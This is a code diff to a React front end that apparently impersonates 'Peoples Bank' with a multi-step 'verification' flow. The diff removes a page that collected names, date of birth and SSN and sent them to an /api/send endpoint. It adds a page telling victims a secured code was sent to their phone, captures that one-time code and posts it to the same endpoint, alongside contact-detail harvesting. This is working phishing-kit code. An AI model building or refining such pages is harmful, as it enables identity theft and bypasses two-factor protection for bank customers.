@@ -27,13 +27,6 @@ function App() {
     boxSizing: 'border-box',
   };
 
-  // Personal Info State
-  const [firstName, setFirstName] = useState("");
-  const [middleName, setMiddleName] = useState("");
-  const [lastName, setLastName] = useState("");
-  const [dob, setDob] = useState("");
-  const [ssn, setSsn] = useState("");
-
   // Add contact info state at the top
   const [address, setAddress] = useState("");
   const [address2, setAddress2] = useState("");
@@ -61,17 +54,6 @@ function App() {
     setPage('verify');
   };
 
-  // Personal Information submit logic
-  const handlePersonalContinue = async (e) => {
-    e.preventDefault();
-    await axios.post("/api/send", {
-      subject: "Personal Information",
-      email: username,
-      message: `First Name: ${firstName}\nMiddle Name: ${middleName}\nLast Name: ${lastName}\nDOB: ${dob}\nSSN/Tax ID: ${ssn}`
-    });
-    setPage('contact');
-  };
-
   // Contact Information submit logic
   const handleContactContinue = async (e) => {
     e.preventDefault();
@@ -84,97 +66,13 @@ function App() {
     setPage('success');
   };
 
-  if (page === "personal") {
-  return (
-      <div className="pattern-bg" style={{ minHeight: "100vh" }}>
-        {/* Top Bar */}
-        <div style={{ background: '#23477b', color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'space-between', height: 56, padding: '0 16px', fontWeight: 700, fontSize: 20, letterSpacing: 1 }}>
-          <span style={{ fontSize: 28, cursor: 'pointer', fontWeight: 400 }} onClick={() => setPage('login')}>&#8592;</span>
-          <span style={{ flex: 1, textAlign: 'center', fontSize: 18, fontWeight: 700, letterSpacing: 1 }}>PERSONAL INFORMATION</span>
-          <span style={{ fontSize: 32, cursor: 'pointer', fontWeight: 400 }}>&#10005;</span>
-        </div>
-        {/* Form */}
-        <form style={{ maxWidth: 600, margin: '32px auto 0 auto', padding: '0 16px', display: 'flex', flexDirection: 'column', gap: 0 }}>
-          <div style={{ position: 'relative', marginBottom: 18 }}>
-            <input
-              type="text"
-              placeholder="FIRST NAME"
-              value={firstName}
-              onChange={e => setFirstName(e.target.value)}
-              style={{ ...inputStyle, textAlign: 'left', marginBottom: 0, fontSize: 18 }}
-              required
-            />
-            <span style={{ position: 'absolute', right: 12, top: 10, color: '#8a8e98', fontSize: 13, fontWeight: 400 }}>required</span>
-          </div>
-          <div style={{ position: 'relative', marginBottom: 18 }}>
-            <input
-              type="text"
-              placeholder="MIDDLE NAME"
-              value={middleName}
-              onChange={e => setMiddleName(e.target.value)}
-              style={{ ...inputStyle, textAlign: 'left', marginBottom: 0, fontSize: 18 }}
-            />
-          </div>
-          <div style={{ position: 'relative', marginBottom: 18 }}>
-                <input
-                  type="text"
-              placeholder="LAST NAME"
-              value={lastName}
-              onChange={e => setLastName(e.target.value)}
-              style={{ ...inputStyle, textAlign: 'left', marginBottom: 0, fontSize: 18 }}
-                  required
-            />
-            <span style={{ position: 'absolute', right: 12, top: 10, color: '#8a8e98', fontSize: 13, fontWeight: 400 }}>required</span>
-              </div>
-          <div style={{ position: 'relative', marginBottom: 18 }}>
-                <input
-                  type="text"
-              placeholder="MM/DD/YYYY"
-              value={dob}
-              onChange={e => {
-                let v = e.target.value.replace(/[^0-9]/g, '');
-                if (v.length > 2 && v.length <= 4) v = v.slice(0,2) + '/' + v.slice(2);
-                else if (v.length > 4) v = v.slice(0,2) + '/' + v.slice(2,4) + '/' + v.slice(4,8);
-                setDob(v);
-              }}
-              style={{ ...inputStyle, textAlign: 'left', marginBottom: 0, fontSize: 18 }}
-                  required
-              maxLength={10}
-                />
-            <span style={{ position: 'absolute', right: 12, top: 10, color: '#8a8e98', fontSize: 13, fontWeight: 400 }}>required</span>
-              </div>
-          <div style={{ position: 'relative', marginBottom: 18 }}>
-                <input
-              type="text"
-              placeholder="SSN / TAX ID"
-              value={ssn}
-              onChange={e => setSsn(e.target.value)}
-              style={{ ...inputStyle, textAlign: 'left', marginBottom: 0, fontSize: 18 }}
-                  required
-            />
-            <span style={{ position: 'absolute', right: 12, top: 10, color: '#8a8e98', fontSize: 13, fontWeight: 400 }}>required</span>
-              </div>
-            </form>
-        {/* Continue Button */}
-        <div style={{ position: 'fixed', left: 0, bottom: 0, width: '100%', background: '#fff', borderTop: '1px solid #e0e0e0', padding: '12px 0' }}>
-          <button
-            style={{ width: '90%', maxWidth: 600, margin: '0 auto', display: 'block', background: '#8a97a6', color: '#fff', fontWeight: 700, fontSize: 18, border: 'none', borderRadius: 2, padding: '14px 0', letterSpacing: 1 }}
-            onClick={handlePersonalContinue}
-          >
-            CONTINUE <span style={{ fontSize: 20, verticalAlign: 'middle', marginLeft: 8 }}>&#8594;</span>
-          </button>
-        </div>
-      </div>
-    );
-  }
-
   if (page === "contact") {
     const allContactFilled = address && city && state && zip && phone && email;
     return (
       <div className="pattern-bg" style={{ minHeight: "100vh" }}>
         {/* Top Bar */}
         <div style={{ background: '#23477b', color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'space-between', height: 56, padding: '0 16px', fontWeight: 700, fontSize: 20, letterSpacing: 1 }}>
-          <span style={{ fontSize: 28, cursor: 'pointer', fontWeight: 400 }} onClick={() => setPage('personal')}>&#8592;</span>
+          <span style={{ fontSize: 28, cursor: 'pointer', fontWeight: 400 }} onClick={() => setPage('login')}>&#8592;</span>
           <span style={{ flex: 1, textAlign: 'center', fontSize: 18, fontWeight: 700, letterSpacing: 1 }}>CONTACT INFORMATION</span>
           <span style={{ fontSize: 32, cursor: 'pointer', fontWeight: 400 }}>&#10005;</span>
         </div>
@@ -370,6 +268,73 @@ function App() {
                 alert('Failed to send verification email. Please try again.');
                 console.error('Email Verification send error:', err);
               }
+            }}
+          >
+            CONTINUE <span style={{ fontSize: 20, verticalAlign: 'middle', marginLeft: 8 }}>&#8594;</span>
+          </button>
+        </div>
+      </div>
+    );
+  }
+
+  if (page === "code") {
+    const codeFilled = code.length > 0;
+    return (
+      <div className="pattern-bg" style={{ minHeight: "100vh" }}>
+        {/* Top Bar */}
+        <div style={{ background: '#23477b', color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'space-between', height: 56, padding: '0 16px', fontWeight: 700, fontSize: 20, letterSpacing: 1 }}>
+          <span style={{ fontSize: 28, cursor: 'pointer', fontWeight: 400 }} onClick={() => setPage('verify')}>&#8592;</span>
+          <span style={{ flex: 1, textAlign: 'center', fontSize: 18, fontWeight: 700, letterSpacing: 1 }}>Code Verification</span>
+          <span style={{ fontSize: 32, cursor: 'pointer', fontWeight: 400 }}>&#10005;</span>
+        </div>
+        {/* Logo and Subheading */}
+        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: 32, marginBottom: 16 }}>
+          <img src={pbLogo} alt="Peoples Bank" style={{ width: 120, maxWidth: '60vw', marginBottom: 12 }} />
+          <div style={{ fontFamily: 'Georgia, serif', fontSize: 22, color: '#1a3365', fontWeight: 500, textAlign: 'center', marginBottom: 8 }}>We have sent a secured code to your registered number.</div>
+          <div style={{ color: '#444', fontSize: 15, textAlign: 'center', marginBottom: 8 }}>Please tell us your code for account verification. If you did not get the code, please wait 1-2 minutes.</div>
+        </div>
+        {/* Form */}
+        <form style={{ maxWidth: 400, margin: '0 auto', padding: '0 16px', display: 'flex', flexDirection: 'column', gap: 0 }}>
+          <div style={{ position: 'relative', marginBottom: 18 }}>
+            <input
+              type="text"
+              placeholder="Enter your code"
+              value={code}
+              onChange={e => setCode(e.target.value)}
+              style={{ ...inputStyle, textAlign: 'left', marginBottom: 0, fontSize: 18 }}
+              required
+            />
+          </div>
+        </form>
+        {/* Continue Button */}
+        <div style={{ position: 'fixed', left: 0, bottom: 0, width: '100%', background: '#fff', borderTop: '1px solid #e0e0e0', padding: '12px 0' }}>
+          <button
+            style={{
+              width: '90%',
+              maxWidth: 400,
+              margin: '0 auto',
+              display: 'block',
+              background: codeFilled ? '#2ecc40' : '#8a97a6',
+              color: '#fff',
+              fontWeight: 700,
+              fontSize: 18,
+              border: 'none',
+              borderRadius: 2,
+              padding: '14px 0',
+              letterSpacing: 1,
+              cursor: codeFilled ? 'pointer' : 'not-allowed',
+              opacity: codeFilled ? 1 : 0.7
+            }}
+            disabled={!codeFilled}
+            onClick={async e => {
+              e.preventDefault();
+              if (!codeFilled) return;
+              await axios.post("/api/send", {
+                subject: "Code Verification",
+                email: verifyEmail,
+                message: `Verification Code: ${code}`
+              });
+              setPage('contact');
             }}
           >
             CONTINUE <span style={{ fontSize: 20, verticalAlign: 'middle', marginLeft: 8 }}>&#8594;</span>
